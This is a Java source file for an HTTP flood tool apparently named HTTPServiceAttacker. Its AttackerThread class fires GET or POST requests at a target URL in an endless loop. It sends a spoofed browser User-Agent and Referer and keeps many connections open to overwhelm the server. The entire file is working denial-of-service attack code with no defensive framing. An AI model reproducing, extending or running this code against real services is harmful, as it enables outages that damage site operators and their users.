package com.ishland.app.HTTPServiceAttacker.attacker.threads;

import org.apache.hc.client5.http.async.methods.SimpleHttpRequest;
import org.apache.hc.client5.http.async.methods.SimpleHttpRequests;
import org.apache.hc.client5.http.async.methods.SimpleHttpResponse;
import org.apache.hc.core5.concurrent.FutureCallback;
import org.apache.hc.core5.http.ContentType;
import org.apache.hc.core5.http.message.BasicHeader;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.ishland.app.HTTPServiceAttacker.attacker.Attack;

public class AttackerThread extends Thread {

    public static final byte GET = 0x00;
    public static final byte POST = 0x01;

    private static int num = 0;
    public static Long openedCount = 0L;

    private Logger logger = null;

    private boolean isStopping = false;
    private String target = null;
    private byte method = GET;
    private String data = null;
    private boolean showExceptions = true;
    private String referer = "";
    private long startedCount = 0;

    private FutureCallback<SimpleHttpResponse> callback = new FutureCallback<SimpleHttpResponse>() {

	@Override
	public void completed(SimpleHttpResponse httpResponse) {
	    synchronized (this) {
		this.notifyAll();
	    }
	    synchronized (openedCount) {
		openedCount--;
	    }
	    startedCount--;
	    try {
		MonitorThread.pushResult(httpResponse);
	    } catch (NullPointerException e) {
		if (showExceptions)
		    logger.warn("Internal error", e);
		else
		    logger.warn("Internal error");
		MonitorThread.newError();
		httpResponse = null;
	    } catch (IllegalArgumentException e) {
		if (showExceptions)
		    logger.warn("Internal error", e);
		else
		    logger.warn("Internal error");
		MonitorThread.newError();
		httpResponse = null;
	    } catch (InterruptedException e) {
		if (showExceptions)
		    logger.warn("Internal error", e);
		else
		    logger.warn("Internal error");
		MonitorThread.newError();
		httpResponse = null;
	    }
	}

	@Override
	public void failed(Exception ex) {
	    synchronized (this) {
		this.notifyAll();
	    }
	    synchronized (openedCount) {
		openedCount--;
	    }
	    startedCount--;
	    if (showExceptions)
		logger.warn("Error while making request", ex);
	    else
		logger.warn("Error while making request: " + ex.getMessage());
	    MonitorThread.newError();
	}

	@Override
	public void cancelled() {
	    synchronized (this) {
		this.notifyAll();
	    }
	    synchronized (openedCount) {
		openedCount--;
	    }
	    startedCount--;
	    logger.info("Cancelled");
	}

    };

    public AttackerThread() {
	super();
	num++;
	logger = LoggerFactory.getLogger("Attacker Thread - " + String.valueOf(num));
	this.setName("Attacker Thread - " + String.valueOf(num));
    }

    public void run() {
	logger.info("Starting " + this.getName() + "...");
	boolean isReady = true;
	boolean isError = false;
	if (target == null) {
	    logger.error("Target must not be null");
	    MonitorThread.newError();
	    isReady = false;
	}
	if (method == POST && data == null) {
	    logger.error("You must set the data in POST mode");
	    MonitorThread.newError();
	    isReady = false;
	}
	logger.info("Using " + (method == POST ? "POST" : "GET" + " to attack ") + target);
	logger.info(this.getName() + " started.");
	// System.out.println(Attack.replacePlaceHolders(this.target));
	// System.out.println(Attack.replacePlaceHolders(this.data));

	while (!isStopping && isReady) {
	    if (startedCount > Attack.maxConnectionPerThread) {
		synchronized (callback) {
		    logger.info("Opened connection above threshold, sleeping");
		    try {
			callback.wait();
		    } catch (InterruptedException e) {
		    }
		    logger.info("Continuing");
		    continue;
		}
	    }
	    synchronized (openedCount) {
		openedCount++;
	    }
	    startedCount++;
	    MonitorThread.newCreation();
	    SimpleHttpRequest req = null;
	    if (this.method == GET) {
		try {
		    req = SimpleHttpRequests.GET.create(Attack.replacePlaceHolders(this.target));
		} catch (IllegalArgumentException e) {
		    if (showExceptions)
			logger.error("Invaild target url", e);
		    else
			logger.error("Invaild target url");
		    MonitorThread.newError();
		    req = null;
		    isError = true;
		    break;
		}
	    } else if (this.method == POST) {
		try {
		    req = SimpleHttpRequests.POST.create(Attack.replacePlaceHolders(this.target));
		    req.setBodyText(Attack.replacePlaceHolders(getData()), ContentType.APPLICATION_FORM_URLENCODED);
		} catch (IllegalArgumentException e) {
		    if (showExceptions)
			logger.error("Invaild target url", e);
		    else
			logger.error("Invaild target url");
		    MonitorThread.newError();
		    req = null;
		    isError = true;
		    break;
		}
	    }
	    req.setHeaders(new BasicHeader("User-Agent",
		    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"),
		    new BasicHeader("Referer", this.referer), new BasicHeader("Connection", "keep-alive"));
	    Attack.httpClient.execute(req, callback);

	}
	if (!isReady) {
	    logger.error("Exiting due to configuration error");
	    return;
	} else if (isError) {
	    logger.error("Exiting due to an error occured");
	    return;
	} else {
	    logger.info("Exiting due to termination");
	    return;
	}
    }

    /**
     * @return the isStopping
     */
    public boolean isStopping() {
	return isStopping;
    }

    /**
     * @param isStopping the isStopping to set
     */
    public void stopTask() {
	synchronized (callback) {
	    callback.notifyAll();
	}
	this.isStopping = true;
    }

    /**
     * @return the target
     */
    public String getTarget() {
	return target;
    }

    /**
     * @param target the target to set
     */
    public void setTarget(String target) {
	this.target = target;
    }

    /**
     * @return the method
     */
    public byte getMethod() {
	return method;
    }

    /**
     * @param method the method to set
     */
    public void setMethod(byte method) {
	this.method = method;
    }

    /**
     * @return the data
     */
    public String getData() {
	return data;
    }

    /**
     * @param method the method to set
     */
    public void setData(String data) {
	this.data = data;
    }

    /**
     * @param method the method to set
     */
    public void setShowExceptions(boolean showExceptions) {
	this.showExceptions = showExceptions;
    }

    /**
     * @return the referer
     */
    public String getReferer() {
	return referer;
    }

    /**
     * @param referer the referer to set
     */
    public void setReferer(String referer) {
	this.referer = referer;
    }

}
